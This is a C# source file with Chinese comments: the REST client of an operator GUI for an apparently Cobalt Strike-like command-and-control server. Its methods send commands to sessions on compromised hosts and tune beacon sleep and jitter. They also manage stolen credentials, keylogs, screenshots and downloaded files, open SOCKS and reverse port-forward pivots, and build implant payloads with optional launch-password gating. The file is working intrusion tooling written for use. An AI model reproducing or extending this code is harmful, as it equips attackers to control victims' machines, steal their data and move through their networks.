using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace CsdevGui
{
    // ---------------------------------------------------------------- JSON 安全取值

    /// <summary>JSON 安全取值: 后端字段增删/改类型都不应抛异常。</summary>
    public static class J
    {
        /// <summary>取子元素, 不存在返回 Undefined。</summary>
        public static JsonElement Field(this JsonElement e, string name)
        {
            JsonElement v;
            if (e.ValueKind == JsonValueKind.Object && e.TryGetProperty(name, out v)) return v;
            return default(JsonElement);
        }

        /// <summary>取数组, 非数组返回空序列。</summary>
        public static IEnumerable<JsonElement> Arr(this JsonElement e, string name)
        {
            var v = e.Field(name);
            if (v.ValueKind == JsonValueKind.Array) return v.EnumerateArray();
            return System.Linq.Enumerable.Empty<JsonElement>();
        }

        public static string Str(this JsonElement e, string name, string def = "")
        {
            var v = e.Field(name);
            if (v.ValueKind == JsonValueKind.String) return v.GetString() ?? def;
            return def;
        }

        public static long Long(this JsonElement e, string name, long def = 0)
        {
            var v = e.Field(name);
            if (v.ValueKind == JsonValueKind.Number)
            {
                long l;
                if (v.TryGetInt64(out l)) return l;
                double d;
                if (v.TryGetDouble(out d)) return (long)d;
                return def;
            }
            if (v.ValueKind == JsonValueKind.String)
            {
                long p;
                if (long.TryParse(v.GetString(), out p)) return p;
            }
            return def;
        }

        public static bool Bool(this JsonElement e, string name, bool def = false)
        {
            var v = e.Field(name);
            if (v.ValueKind == JsonValueKind.True) return true;
            if (v.ValueKind == JsonValueKind.False) return false;
            return def;
        }
    }

    // ---------------------------------------------------------------- 编码

    /// <summary>输出解码: 严格 UTF-8 优先, 失败退 GBK(936)。</summary>
    public static class Codec
    {
        private static readonly UTF8Encoding StrictUtf8 = new UTF8Encoding(false, true);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern int MultiByteToWideChar(uint codePage, uint flags, byte[] src, int srcLen,
                                                      [Out] char[] dst, int dstLen);

        private const uint CP_GBK = 936;

        /// <summary>
        /// GBK 解码。走 Win32 MultiByteToWideChar, 避免引入
        /// System.Text.Encoding.CodePages 包与 Encoding.RegisterProvider 调用。
        /// </summary>
        public static string Gbk(byte[] data)
        {
            if (data == null || data.Length == 0) return "";
            try
            {
                int n = MultiByteToWideChar(CP_GBK, 0, data, data.Length, null, 0);
                if (n <= 0) return Encoding.UTF8.GetString(data);
                var buf = new char[n];
                int got = MultiByteToWideChar(CP_GBK, 0, data, data.Length, buf, n);
                if (got <= 0) return Encoding.UTF8.GetString(data);
                return new string(buf, 0, got);
            }
            catch { return Encoding.UTF8.GetString(data); }
        }

        /// <summary>双编码自适应解码。</summary>
        public static string Auto(byte[] data)
        {
            if (data == null || data.Length == 0) return "";
            try { return StrictUtf8.GetString(data); }
            catch { return Gbk(data); }
        }

        /// <summary>服务端输出是 base64; 解码失败则原样返回, 不抛异常。</summary>
        public static string B64(string b64)
        {
            if (string.IsNullOrEmpty(b64)) return "";
            try { return Auto(Convert.FromBase64String(b64)); }
            catch { return b64; }
        }

        /// <summary>去掉 CR 并统一换行, 便于终端渲染。</summary>
        public static string Clean(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("\r\n", "\n").Replace('\r', '\n').TrimEnd('\n');
        }
    }

    // ---------------------------------------------------------------- REST 客户端

    /// <summary>
    /// HTTP 失败响应的统一文案 (纯函数, 无 UI 依赖 —— --selftest 直接断言它)。
    ///
    /// 404 单独处理: 服务端路由不存在时 Go 的 mux 回的是纯文本 "404 page not found",
    /// 光看这一句分不清是"接口没编进服务端"还是"请求写错了", 而实际最常见、也最容易被
    /// 误当成 GUI bug 的成因是**服务端二进制过旧**(GUI 已更新, 服务端还是老构建,
    /// 新端点压根不存在) —— 所以这里直接给出可操作的一步: 重新构建并重启服务端。
    /// 其余 HTTP 错误照旧原样显示 (状态码 + 服务端正文)。
    /// </summary>
    public static class ApiError
    {
        /// <summary>服务端缺路由时的可操作提示 (界面与自测共用同一份文案)。</summary>
        public const string StaleServerHint =
            "通常是服务端二进制过旧 —— 重新构建并重启: "
          + "cd D:\\csdev-c2\\go; go build -o csdev-server.exe .  然后重启 csdev-server.exe";

        /// <param name="code">HTTP 状态码。</param>
        /// <param name="body">服务端响应正文 (原样保留, 只截断超长)。</param>
        /// <param name="path">请求路径 (可空), 404 时写进文案便于定位是哪个接口。</param>
        public static string Describe(int code, string body, string path = "")
        {
            string hint;
            if (code == 401) hint = "未认证或令牌已失效, 请点顶栏『登录』";
            else if (code == 403) hint = "权限不足 (该操作需要 admin)";
            else if (code == 404)
            {
                string p = (path ?? "").Trim();
                hint = "服务端缺少该路由" + (p.Length > 0 ? " " + p : "") + " (HTTP 404): " + StaleServerHint;
            }
            else hint = "HTTP " + code;

            string detail = (body ?? "").Trim();
            if (detail.Length > 200) detail = detail.Substring(0, 200) + " ...";
            return string.IsNullOrEmpty(detail) ? hint : hint + "  |  " + detail;
        }
    }

    /// <summary>服务端 REST 客户端。只负责 HTTP 与 JSON 解析, 不做 UI 决策。</summary>
    public sealed class CsdevApi
    {
        // 常规请求短超时; 载荷生成是同步编译, 需要长超时; 文件字节流用中等超时
        private readonly HttpClient _http = new HttpClient { Timeout = TimeSpan.FromSeconds(8) };
        private readonly HttpClient _slow = new HttpClient { Timeout = TimeSpan.FromMinutes(10) };
        private readonly HttpClient _bin = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };

        private string _base = "http://127.0.0.1:8443";
        private string _token = "";

        public string BaseUrl
        {
            get { return _base; }
            set
            {
                string v = (value ?? "").Trim().TrimEnd('/');
                if (v.Length == 0) v = "http://127.0.0.1:8443";
                if (!v.StartsWith("http://", StringComparison.OrdinalIgnoreCase) &&
                    !v.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                    v = "http://" + v;
                _base = v;
            }
        }

        /// <summary>
        /// 可选 Bearer 令牌 (服务端 auth.go 的访问控制)。为空时不发 Authorization 头,
        /// 与未启用认证的服务端保持完全兼容。
        /// </summary>
        public string Token
        {
            get { return _token; }
            set { _token = (value ?? "").Trim(); }
        }

        public bool HasToken { get { return _token.Length > 0; } }

        private HttpRequestMessage NewRequest(HttpMethod method, string path)
        {
            var req = new HttpRequestMessage(method, _base + path);
            if (_token.Length > 0)
            {
                // 用 TryAddWithoutValidation: 令牌是 hex 字符串, 不需要 scheme 校验
                req.Headers.TryAddWithoutValidation("Authorization", "Bearer " + _token);
            }
            return req;
        }

        /// <summary>把非 2xx 响应转成可读异常, 让调用方只在状态栏提示。</summary>
        private static string DescribeFailure(HttpResponseMessage resp, string body)
        {
            string path = "";
            try { if (resp.RequestMessage != null && resp.RequestMessage.RequestUri != null) path = resp.RequestMessage.RequestUri.AbsolutePath; }
            catch { }
            return ApiError.Describe((int)resp.StatusCode, body, path);
        }

        private async Task<JsonDocument> SendJsonAsync(HttpRequestMessage req, HttpClient c)
        {
            using (req)
            using (var resp = await c.SendAsync(req).ConfigureAwait(false))
            {
                string text = await resp.Content.ReadAsStringAsync().ConfigureAwait(false);
                if (!resp.IsSuccessStatusCode)
                    throw new InvalidOperationException(DescribeFailure(resp, text));
                if (string.IsNullOrWhiteSpace(text))
                    throw new InvalidOperationException("服务端返回空响应 (HTTP " + (int)resp.StatusCode + ")");
                return JsonDocument.Parse(text);
            }
        }

        public Task<JsonDocument> GetJsonAsync(string path, HttpClient c)
        {
            return SendJsonAsync(NewRequest(HttpMethod.Get, path), c);
        }

        public Task<JsonDocument> GetStateAsync() { return GetJsonAsync("/api/state", _http); }
        public Task<JsonDocument> GetListenersAsync() { return GetJsonAsync("/api/listeners", _http); }

        /// <summary>
        /// 运行时新建监听器: POST /api/listener/add {kind, addr}。
        ///
        /// 契约 (与服务端并行实现约好):
        ///   成功 {"ok":true,"id":"...","kind":"tcp","addr":"0.0.0.0:8444"}
        ///   失败 {"ok":false,"error":"..."}
        /// kind 取值: http / https / tcp / smb / dns / extc2。
        ///
        /// 服务端**没有**该路由时 (二进制过旧) 会走 404, 由 ApiError.Describe 统一
        /// 转成"服务端缺少该路由 ... 二进制过旧"的可操作提示 —— 绝不假装成功。
        /// 解析层 (ListenerParse.Result) 只读 ok/error/id, 服务端多加字段不影响。
        /// </summary>
        public Task<JsonDocument> AddListenerAsync(string kind, string addr)
        {
            return PostJsonAsync("/api/listener/add", new { kind, addr });
        }

        /// <summary>
        /// 运行时停止 / 移除监听器: POST /api/listener/remove {id}。
        ///
        /// id 是 /api/listener/add 返回的那个句柄, 也可能由服务端在 listeners[] 里补上
        /// (字段被追加, 保持兼容解析)。主 HTTP listener 不允许删除: 服务端会回
        /// {"ok":false,"error":"..."}, 调用方**原样显示**该 error, 并把它的按钮置灰。
        /// </summary>
        public Task<JsonDocument> RemoveListenerAsync(string id)
        {
            return PostJsonAsync("/api/listener/remove", new { id });
        }
        public Task<JsonDocument> GetFormatsAsync() { return GetJsonAsync("/api/payload/formats", _http); }
        public Task<JsonDocument> GetEventlogAsync(int limit) { return GetJsonAsync("/api/eventlog?limit=" + limit, _http); }

        /// <summary>会话输出增量。since 为纳秒级时间戳, 服务端按 ts &gt;= since 返回。</summary>
        public Task<JsonDocument> GetOutputAsync(string sid, long since)
        {
            return GetJsonAsync("/api/output?sid=" + Uri.EscapeDataString(sid) + "&since=" + since, _http);
        }

        public async Task<JsonDocument> PostJsonAsync<T>(string path, T body, bool slow = false)
        {
            HttpClient c = slow ? _slow : _http;
            var req = NewRequest(HttpMethod.Post, path);
            string json = JsonSerializer.Serialize(body);
            req.Content = new StringContent(json, Encoding.UTF8, "application/json");
            return await SendJsonAsync(req, c).ConfigureAwait(false);
        }

        public Task<JsonDocument> SendCommandAsync(string sid, string cmd)
        {
            return PostJsonAsync("/api/command", new { sid, cmd });
        }

        public Task<JsonDocument> SetSleepAsync(string sid, long sleepMs, long jitter)
        {
            return PostJsonAsync("/api/session/sleep", new { sid, sleep_ms = sleepMs, jitter });
        }

        public Task<JsonDocument> ExitSessionAsync(string sid)
        {
            return PostJsonAsync("/api/session/exit", new { sid });
        }

        public Task<JsonDocument> KillAllAsync()
        {
            return PostJsonAsync("/api/killall", new { });
        }

        // ---------------------------------------------------------------- 脚本引擎

        /// <summary>
        /// 插件菜单 / 命令 / 诊断全量: GET /api/scripts。
        /// 返回 loaded[] commands[] menus[] menubar[] missing[] diag[] output[]。
        /// </summary>
        public Task<JsonDocument> GetScriptsAsync()
        {
            return GetJsonAsync("/api/scripts", _http);
        }

        /// <summary>
        /// 执行脚本命令 (菜单项点击也走这里): POST /api/script/run {name, sid, args}。
        ///
        /// 服务端 handleScriptRun 的实参拼接是 <c>args = [sid, ...req.args]</c>,
        /// 即 <c>$1</c> 恒为会话号 (与菜单项回调里普遍使用 $1 的写法一致)。
        /// name 走 a.RunCommand —— 只有命令表里的名字才会被执行, 未命中回
        /// "未找到脚本命令 &lt;name&gt;" (由调用方原样展示, 不做静默降级)。
        /// </summary>
        public Task<JsonDocument> RunScriptAsync(string name, string sid, string[] args)
        {
            return PostJsonAsync("/api/script/run", new { name, sid, args = args ?? new string[0] });
        }

        /// <summary>
        /// 执行一个**插件菜单项**的本体: POST /api/script/menu {parent, name, sid, args}。
        ///
        /// 为什么不能走 /api/script/run: 菜单项的名字只存在于脚本里(popup 体内的
        /// item(...)), 不是命令表成员。实测原版 default.cna 的 86 个可执行菜单项里
        /// 没有一个名字命中命令表 —— 走 run 那条路会全部回"未找到脚本命令"。
        ///
        /// 服务端按 (parent, name) 定位菜单项, 名字比较时两边都剥掉 &amp; 助记符,
        /// 所以这里传原始名(Raw)或显示名都可以; $1 同样是会话号。
        /// 响应里的 warnings 是"本地没有 CS 客户端私有 UI, 已跳过的函数"——
        /// 调用方应当展示, 不要吞掉。
        /// </summary>
        public Task<JsonDocument> RunScriptMenuAsync(string parent, string name, string sid, string[] args)
        {
            return PostJsonAsync("/api/script/menu", new
            {
                parent = parent ?? "",
                name = name ?? "",
                sid = sid ?? "",
                args = args ?? new string[0],
            });
        }

        // ---------------------------------------------------------------- 插件包

        /// <summary>
        /// 插件包列表: GET /api/plugins。
        /// 返回 {ok, root, plugins[{name,path,kind,main,files,bytes,loaded,menus,has_main,err}],
        /// selected[], loaded[]}。插件目录未配置 / 不存在时服务端**也回 HTTP 200**, 但 ok=false +
        /// error —— 所以解析层区分 Present（响应是对象）与 Ok（服务端说列表有效），见 PluginParse。
        /// </summary>
        public Task<JsonDocument> GetPluginsAsync()
        {
            return GetJsonAsync("/api/plugins", _http);
        }

        /// <summary>
        /// 应用插件选择 / 切换插件根: POST /api/plugin/set {paths, root}。
        ///
        /// paths 为空数组 = 全部卸载(只留 scripts/*.cna); root 非空 = 先改插件根再重建。
        /// 服务端语义是"重建引擎"而不是增量卸载: 成功返回时引擎已重建完毕, 调用方必须
        /// 紧接着重拉 GET /api/plugins 与 GET /api/scripts。
        /// 实测(8630 真实服务端, 插件根 8 个包): 选中 LSTAR+TaoWu 78 ms, 全部卸载 237 ms,
        /// 提交无主文件的包 4 ms 且回 ok=false —— 8 秒常规超时足够, 不需要单独的长超时客户端。
        /// </summary>
        public Task<JsonDocument> SetPluginsAsync(IList<string> paths, string root)
        {
            var body = new Dictionary<string, object>();
            body["paths"] = paths == null ? new List<string>() : new List<string>(paths);
            if (!string.IsNullOrEmpty(root)) body["root"] = root;
            return PostJsonAsync("/api/plugin/set", body);
        }

        // ---------------------------------------------------------------- 目标库

        /// <summary>新增目标: POST /api/targets {host, ip, os, note}。</summary>
        public Task<JsonDocument> AddTargetAsync(string host, string ip, string os, string note)
        {
            return PostJsonAsync("/api/targets", new { host, ip, os, note });
        }

        /// <summary>
        /// 删除目标: POST /api/targets {delete: id}。
        /// 字段名 delete 是 C# 关键字, 故用字典构造请求体 (不依赖标识符转义)。
        /// </summary>
        public Task<JsonDocument> DeleteTargetAsync(long id)
        {
            var body = new Dictionary<string, object>();
            body["delete"] = id;
            return PostJsonAsync("/api/targets", body);
        }

        // ---------------------------------------------------------------- 删除/清空

        /// <summary>从列表删除会话记录 (仅清理服务端状态, 不向目标下发命令)。</summary>
        public Task<JsonDocument> RemoveSessionAsync(string sid)
        {
            return PostJsonAsync("/api/session/remove", new { sid });
        }

        /// <summary>删除一条凭据记录。</summary>
        public Task<JsonDocument> DeleteCredentialAsync(long id)
        {
            return PostJsonAsync("/api/credentials/delete", new { id });
        }

        /// <summary>删除一条下载记录 + 落盘文件。</summary>
        public Task<JsonDocument> DeleteDownloadAsync(long id)
        {
            return PostJsonAsync("/api/downloads/delete", new { id });
        }

        /// <summary>删除一条截屏记录 + 落盘文件。</summary>
        public Task<JsonDocument> DeleteScreenshotAsync(long id)
        {
            return PostJsonAsync("/api/screenshots/delete", new { id });
        }

        /// <summary>清空全部键盘记录。</summary>
        public Task<JsonDocument> ClearKeylogsAsync()
        {
            return PostJsonAsync("/api/keylogs/clear", new { });
        }

        /// <summary>清空已结束的作业 (保留 running)。</summary>
        public Task<JsonDocument> ClearJobsAsync()
        {
            return PostJsonAsync("/api/jobs/clear", new { });
        }

        /// <summary>导出目标 CSV: GET /api/targets/csv (服务端带 UTF-8 BOM, 走字节流不解析 JSON)。</summary>
        public Task<byte[]> GetTargetsCsvAsync()
        {
            return GetBytesAsync("/api/targets/csv");
        }

        // ---------------------------------------------------------------- 代理枢轴

        /// <summary>启动 SOCKS: POST /api/proxy/start {sid, port} (服务端回 message 与 usage)。</summary>
        public Task<JsonDocument> ProxyStartAsync(string sid, int port)
        {
            return PostJsonAsync("/api/proxy/start", new { sid, port });
        }

        /// <summary>停止 SOCKS: POST /api/proxy/stop {sid, port} (运行键 sid:port, 对 rportfwd 无效)。</summary>
        public Task<JsonDocument> ProxyStopAsync(string sid, int port)
        {
            return PostJsonAsync("/api/proxy/stop", new { sid, port });
        }

        /// <summary>启动反向端口转发: POST /api/proxy/rportfwd/start {sid, port, target}。</summary>
        public Task<JsonDocument> RportfwdStartAsync(string sid, int port, string target)
        {
            return PostJsonAsync("/api/proxy/rportfwd/start", new { sid, port, target });
        }

        /// <summary>
        /// 停止反向端口转发: POST /api/proxy/rportfwd/stop {sid, port}。
        ///
        /// 端点依据 (只读核对 go/proxy.go, 未修改):
        /// RPortfwdStop 只挂在 /api/proxy/rportfwd/stop; 而 /api/proxy/stop 走
        /// ProxyStop -&gt; proxyRunKey(sid, port), 反向运行的键是 "reverse:sid"
        /// (proxy.go 中 reverse run 的注册键), 用 /api/proxy/stop 停不掉。
        /// </summary>
        public Task<JsonDocument> RportfwdStopAsync(string sid, int port)
        {
            return PostJsonAsync("/api/proxy/rportfwd/stop", new { sid, port });
        }

        /// <summary>
        /// 载荷生成 (服务端同步执行 PowerShell 编译, 走长超时客户端)。
        ///
        /// 请求体由调用方构造。除 format/host/port/ssl/out_file/sleep/jitter 外,
        /// 还认一个可选的 <c>password</c>: 非空 = 启用"启动口令门控", 生成器把
        /// 随机盐 + SHA256(盐||口令) 编进植入体, 运行时必须带口令参数(或环境变量
        /// CSDEV_TOKEN)才上线; 留空 = 不带门控, 直接运行。
        /// 口令不属于"格式"的一部分, 因此序列化与校验都由载荷页显式控制,
        /// 见 PayloadRequest.Build (纯函数, 自测直接断言它的输出)。
        /// </summary>
        public Task<JsonDocument> BuildPayloadAsync(object req)
        {
            return PostJsonAsync("/api/payload/build", req, true);
        }

        /// <summary>
        /// 拉取服务端当前公钥 (GET /api/pubkey)。
        ///
        /// 客户端本地生成载荷时用它覆写进载荷配置槽, 保证载荷与服务端私钥同源 ——
        /// 不再依赖仓库里那根可能漂移的 pubkey.h。
        /// </summary>
        public Task<JsonDocument> GetPubkeyAsync()
        {
            return GetJsonAsync("/api/pubkey", _http);
        }

        /// <summary>登录取令牌 (POST /api/login {user, pass})。</summary>
        public async Task<string> LoginAsync(string user, string pass)
        {
            using (var doc = await PostJsonAsync("/api/login", new { user, pass }).ConfigureAwait(false))
            {
                var root = doc.RootElement;
                if (!root.Bool("ok"))
                    throw new InvalidOperationException(root.Str("error", "登录失败"));
                string tok = root.Str("token");
                if (tok.Length == 0)
                    throw new InvalidOperationException("服务端返回 ok 但未包含 token 字段");
                return tok;
            }
        }

        // ---------------------------------------------------------------- 操作员账号

        /// <summary>
        /// 登录取令牌 + 角色 (POST /api/login {user, pass})。
        ///
        /// 与 LoginAsync 的区别只是把 role 一起带出来: 账号管理区要靠 token 的 role
        /// 判断能不能用 (不是 admin 就置灰并写明原因, 而不是等撞 403 才报错)。
        /// </summary>
        public async Task<LoginResult> LoginFullAsync(string user, string pass)
        {
            using (var doc = await PostJsonAsync("/api/login", new { user, pass }).ConfigureAwait(false))
            {
                return AccountParse.Login(doc.RootElement);
            }
        }

        /// <summary>账号列表: GET /api/users (需 admin) -> {ok, users:[{user, role, last, last_text}]}。</summary>
        public Task<JsonDocument> GetUsersAsync() { return GetJsonAsync("/api/users", _http); }

        /// <summary>新建账号: POST /api/user/new {user, pass, role} (需 admin)。</summary>
        public Task<JsonDocument> AddUserAsync(string user, string pass, string role)
        {
            return PostJsonAsync("/api/user/new", new { user, pass, role });
        }

        /// <summary>
        /// 删除账号: POST /api/user/delete {user} (需 admin)。
        /// 服务端会拒绝"删自己"与"删最后一个 admin", 并把原因放在 error 里 —— 原样显示。
        /// </summary>
        public Task<JsonDocument> DeleteUserAsync(string user)
        {
            return PostJsonAsync("/api/user/delete", new { user });
        }

        /// <summary>改口令: POST /api/user/pass {user, pass} (需 admin)。</summary>
        public Task<JsonDocument> SetUserPassAsync(string user, string pass)
        {
            return PostJsonAsync("/api/user/pass", new { user, pass });
        }

        /// <summary>注销当前令牌: POST /api/logout (服务端幂等, 无令牌也回 ok)。</summary>
        public Task<JsonDocument> LogoutAsync() { return PostJsonAsync("/api/logout", new { }); }

        // ---------------------------------------------------------------- 报告导出

        /// <summary>全量报告 JSON: GET /api/report/json (需 Bearer; 返回体是整份快照, 不是文件下载)。</summary>
        public Task<byte[]> GetReportJsonAsync() { return GetBytesAsync(ReportParse.JsonUrl); }

        /// <summary>自包含 HTML 报告: GET /api/report/html (单文件, 内嵌 CSS)。</summary>
        public Task<byte[]> GetReportHtmlAsync() { return GetBytesAsync(ReportParse.HtmlUrl); }

        /// <summary>
        /// 分类 CSV 导出: GET /api/report/csv?kind=..
        ///
        /// **必须按字节收**: 响应体以 EF BB BF 开头 (Excel 靠它认中文), 任何
        /// ReadAsStringAsync + 重编码都会把 BOM 弄丢或变成 U+FEFF。
        /// kind 非法时服务端回 HTTP 400 (内容变成 JSON 错误说明), GetBytesAsync 会把它
        /// 转成带状态码的异常 —— 不会把错误说明当 CSV 存盘。
        /// </summary>
        public Task<byte[]> GetReportCsvAsync(string kind)
        {
            return GetBytesAsync(ReportParse.CsvUrl(kind));
        }

        // ---------------------------------------------------------------- 下载文件内容

        /// <summary>
        /// 取回已下载文件的**内容**: GET /api/download/file?id=&lt;记录号&gt;。
        ///
        /// 参数名是 <c>id</c> (go/v2_api.go handleDownloadFile: strconv.ParseUint(query "id")),
        /// 不是 sid/name —— 传错只会拿到 404 page not found, 会被 ApiError 误报成
        /// "服务端二进制过旧"。找不到记录时服务端同样回 http.NotFound (纯文本 404)。
        /// </summary>
        public Task<byte[]> GetDownloadFileAsync(long id)
        {
            return GetBytesAsync("/api/download/file?id=" + id.ToString());
        }

        // ---------------------------------------------------------------- 会话控制

        /// <summary>
        /// 催一次心跳: POST /api/session/checkin {sid} (对标 CS 的 checkin)。
        ///
        /// 服务端把该会话 sleep 临时压到 100ms 并下发一条 sleep 任务, 收到下一次上行后
        /// 自动恢复原值; 只对 v2 会话有效, 非 v2 回 {"ok":false,"error":"仅 v2 会话支持 checkin"}。
        /// 响应是 JSON, 走常规客户端 (不是字节流)。
        /// </summary>
        public Task<JsonDocument> CheckinAsync(string sid)
        {
            return PostJsonAsync("/api/session/checkin", new { sid });
        }

        /// <summary>取原始字节流 (截屏 / 下载文件)。</summary>
        public async Task<byte[]> GetBytesAsync(string path)
        {
            var req = NewRequest(HttpMethod.Get, path);
            using (req)
            using (var resp = await _bin.SendAsync(req).ConfigureAwait(false))
            {
                if (!resp.IsSuccessStatusCode)
                {
                    string text = await resp.Content.ReadAsStringAsync().ConfigureAwait(false);
                    throw new InvalidOperationException(DescribeFailure(resp, text));
                }
                return await resp.Content.ReadAsByteArrayAsync().ConfigureAwait(false);
            }
        }
    }
}
